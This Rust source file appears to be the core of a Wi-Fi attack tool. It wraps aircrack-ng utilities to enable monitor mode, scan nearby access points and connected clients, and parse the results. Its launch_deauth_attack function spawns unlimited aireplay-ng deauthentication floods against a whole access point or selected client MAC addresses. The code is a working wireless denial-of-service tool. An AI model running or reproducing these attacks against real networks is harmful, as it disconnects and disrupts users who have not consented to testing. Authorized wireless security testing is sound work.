use crate::globals::*;
use std::process::Command;

use serde::{Deserialize, Serialize};

#[derive(Debug, Deserialize)]
struct RawAP {
    #[serde(rename = "BSSID")]
    bssid: String,
    #[serde(rename = " First time seen")]
    first_time_seen: String,
    #[serde(rename = " Last time seen")]
    last_time_seen: String,
    #[serde(rename = " channel")]
    channel: String,
    #[serde(rename = " Speed")]
    speed: String,
    #[serde(rename = " Privacy")]
    privacy: String,
    #[serde(rename = " Cipher")]
    _cipher: String,
    #[serde(rename = " Authentication")]
    _authentication: String,
    #[serde(rename = " Power")]
    power: String,
    #[serde(rename = " # beacons")]
    _beacons: String,
    #[serde(rename = " # IV")]
    _iv: String,
    #[serde(rename = " LAN IP")]
    _lan_ip: String,
    #[serde(rename = " ID-length")]
    id_length: String,
    #[serde(rename = " ESSID")]
    essid: String,
    #[serde(rename = " Key")]
    _key: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct AP {
    pub essid: String,
    pub bssid: String,
    pub band: String,
    pub channel: String,
    pub speed: String,
    pub power: String,
    pub privacy: String,
    pub first_time_seen: String,
    pub last_time_seen: String,
    pub clients: Vec<Client>,
}

#[derive(Debug, Deserialize)]
struct RawClient {
    #[serde(rename = "Station MAC")]
    station_mac: String,
    #[serde(rename = " First time seen")]
    first_time_seen: String,
    #[serde(rename = " Last time seen")]
    last_time_seen: String,
    #[serde(rename = " Power")]
    power: String,
    #[serde(rename = " # packets")]
    packets: String,
    #[serde(rename = " BSSID")]
    bssid: String,
    #[serde(rename = " Probed ESSIDs")]
    _probed_essids: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Client {
    pub mac: String,
    pub packets: String,
    pub power: String,
    pub first_time_seen: String,
    pub last_time_seen: String,
}

pub fn get_interfaces() -> Vec<String> {
    let cmd = Command::new("sh")
        .args(["-c", "iw dev | awk \'$1==\"Interface\"{print $2}\'"])
        .output()
        .expect("failed to execute process: sh");

    if !cmd.status.success() {
        return vec![];
    }

    let out = String::from_utf8(cmd.stdout).unwrap();

    out.split_terminator('\n').map(String::from).collect()
}

pub fn enable_monitor_mode(iface: &str) -> Result<String, ()> {
    let check_monitor_cmd = Command::new("iw")
        .args(["dev", iface, "info"])
        .output()
        .expect("failed to execute process: iw");

    if !check_monitor_cmd.status.success() {
        return Err(());
    }

    let check_monitor_output = String::from_utf8(check_monitor_cmd.stdout).unwrap();

    if check_monitor_output.contains("type monitor") {
        return Ok(iface.to_string());
    }

    let enable_monitor_cmd = Command::new("airmon-ng")
        .args(["start", iface])
        .output()
        .expect("failed to execute process: airmon-ng");

    if !enable_monitor_cmd.status.success() {
        return Err(());
    }

    let check_monitor_cmd = Command::new("iw")
        .args(["dev", &(iface.to_string() + "mon"), "info"])
        .output()
        .expect("failed to execute process: iw");

    if !check_monitor_cmd.status.success() {
        return Err(());
    }

    let check_monitor_output = String::from_utf8(check_monitor_cmd.stdout).unwrap();

    match check_monitor_output.contains("type monitor") {
        true => Ok(iface.to_string() + "mon"),
        false => Err(()),
    }
}

pub fn disable_monitor_mode(iface: &str) -> Result<(), ()> {
    let check_monitor_cmd = Command::new("iw")
        .args(["dev", iface, "info"])
        .output()
        .expect("failed to execute process: iw");

    if !check_monitor_cmd.status.success() {
        return Err(());
    }

    let check_monitor_output = String::from_utf8(check_monitor_cmd.stdout).unwrap();

    if !check_monitor_output.contains("type monitor") {
        return Ok(());
    }

    let disable_monitor_cmd = Command::new("airmon-ng")
        .args(["stop", iface])
        .output()
        .expect("failed to execute process: airmon-ng");

    match disable_monitor_cmd.status.success() {
        true => Ok(()),
        false => Err(()),
    }
}

pub fn launch_scan_process(args: &[&str]) {
    let iface = match IFACE.lock().unwrap().as_ref() {
        Some(res) => res.to_string(),
        None => return,
    };

    match SCAN_PROC.lock().unwrap().as_mut() {
        Some(child) => {
            child.kill().unwrap();
            child.wait().unwrap();
        }
        None => (),
    };

    std::fs::remove_file(SCAN_PATH.to_string() + "-01.csv").ok();

    let mut proc_args = vec![
        iface.as_str(),
        "-a",
        "--output-format",
        "csv",
        "-w",
        SCAN_PATH,
        "--write-interval",
        "1",
    ];
    proc_args.append(&mut args.to_vec());

    let child = std::process::Command::new("airodump-ng")
        .args(proc_args)
        .stdout(std::process::Stdio::null())
        .spawn()
        .expect("failed to execute process: airodump-ng");

    SCAN_PROC.lock().unwrap().replace(child);
}

pub fn stop_scan_process() {
    match SCAN_PROC.lock().unwrap().as_mut() {
        Some(child) => {
            child.kill().unwrap();
            child.wait().unwrap();
        }
        None => (),
    };

    SCAN_PROC.lock().unwrap().take();
}

pub fn get_airodump_data() -> Option<Vec<AP>> {
    let mut aps = vec![];
    let full_path = SCAN_PATH.to_string() + "-01.csv";
    let csv_file = match std::fs::read_to_string(full_path) {
        Ok(file) => file,
        Err(_) => return None,
    };

    let file_parts: Vec<&str> = csv_file.split("\r\n\r\n").collect();
    let ap_part = if file_parts.len() >= 1 {
        file_parts[0]
    } else {
        ""
    };
    let cli_part = if file_parts.len() >= 2 {
        file_parts[1]
    } else {
        ""
    };

    let mut ap_reader = csv::Reader::from_reader(ap_part.as_bytes());
    let mut cli_reader = csv::Reader::from_reader(cli_part.as_bytes());

    for result in ap_reader.deserialize::<RawAP>() {
        match result {
            Ok(res) => {
                let channel_nb = res.channel.trim_start().parse::<i32>().unwrap_or(-1);
                let mut essid = res.essid.trim_start().to_string();

                if essid.is_empty() {
                    essid = format!("[Hidden ESSID] (length: {})", res.id_length.trim_start());
                }

                aps.push(AP {
                    essid,
                    bssid: res.bssid.trim_start().to_string(),
                    band: if channel_nb > 14 {
                        "5 GHz".to_string()
                    } else {
                        "2.4 GHz".to_string()
                    },
                    channel: res.channel.trim_start().to_string(),
                    speed: res.speed.trim_start().to_string(),
                    power: res.power.trim_start().to_string(),
                    privacy: res.privacy.trim_start().to_string(),
                    first_time_seen: res.first_time_seen.trim_start().to_string(),
                    last_time_seen: res.last_time_seen.trim_start().to_string(),
                    clients: vec![],
                })
            }
            Err(_) => {}
        }
    }

    for result in cli_reader.deserialize::<RawClient>() {
        match result {
            Ok(res) => {
                for ap in aps.iter_mut() {
                    if ap.bssid == res.bssid.trim_start() {
                        ap.clients.push(Client {
                            mac: res.station_mac.trim_start().to_string(),
                            packets: res.packets.trim_start().to_string(),
                            power: res.power.trim_start().to_string(),
                            first_time_seen: res.first_time_seen.trim_start().to_string(),
                            last_time_seen: res.last_time_seen.trim_start().to_string(),
                        })
                    }
                }
            }
            Err(_) => {}
        }
    }

    Some(aps)
}

pub fn launch_deauth_attack(ap_bssid: &str, only_specific_clients: Option<Vec<String>>) {
    let iface = match IFACE.lock().unwrap().as_ref() {
        Some(res) => res.to_string(),
        None => return,
    };

    let mut attack_pool = ATTACK_POOL
        .lock()
        .unwrap();

    let attack_targets = match only_specific_clients {
        Some(specific_clients) => {
            let mut cli_attack_targets = vec![];
            for cli in specific_clients {
                cli_attack_targets.push((
                    cli.to_owned(),
                    Command::new("aireplay-ng")
                        .args(["-0", "0", "-D", "-a", ap_bssid, "-c", &cli, &iface])
                        .stdout(std::process::Stdio::null())
                        .spawn()
                        .expect("failed to execute process: aireplay-ng"),
                ));
            }
            AttackTargets::Selection(cli_attack_targets)
        }
        None => {
            AttackTargets::All(
                Command::new("aireplay-ng")
                    .args(["-0", "0", "-D", "-a", ap_bssid, &iface])
                    .stdout(std::process::Stdio::null())
                    .spawn()
                    .expect("failed to execute process: aireplay-ng"),
            )
        }
    };

    attack_pool.insert(
        ap_bssid.to_string(),
        attack_targets,
    );
}

pub fn stop_deauth_attack(ap_bssid: &str) {
    let mut attack_pool = ATTACK_POOL.lock().unwrap();
    if let Some(attack_target) = attack_pool.get_mut(ap_bssid) {
        match attack_target {
            AttackTargets::All(child) => {
                child.kill().unwrap();
                child.wait().unwrap();

            }
            AttackTargets::Selection(child_list) => {
                for (_cli, child) in child_list {
                    child.kill().unwrap();
                    child.wait().unwrap();
                }
            }
        }
    }
    attack_pool.remove(ap_bssid);
}

pub fn app_cleanup() {
    if let Some(child) = SCAN_PROC.lock().unwrap().as_mut() {
        child.kill().unwrap();
        child.wait().unwrap();
    }

    for attacked_ap in ATTACK_POOL.lock().unwrap().iter_mut() {
        match attacked_ap.1 {
            AttackTargets::All(child) => {
                child.kill().unwrap();
                child.wait().unwrap();
            }
            AttackTargets::Selection(child_list) => {
                for (_cli, child) in child_list {
                    child.kill().unwrap();
                    child.wait().unwrap();
                }
            }
        }
    }

    if let Some(iface) = IFACE.lock().unwrap().as_ref() {
        disable_monitor_mode(iface).ok();
    }

    std::fs::remove_file(SCAN_PATH.to_string() + "-01.csv").ok();
}
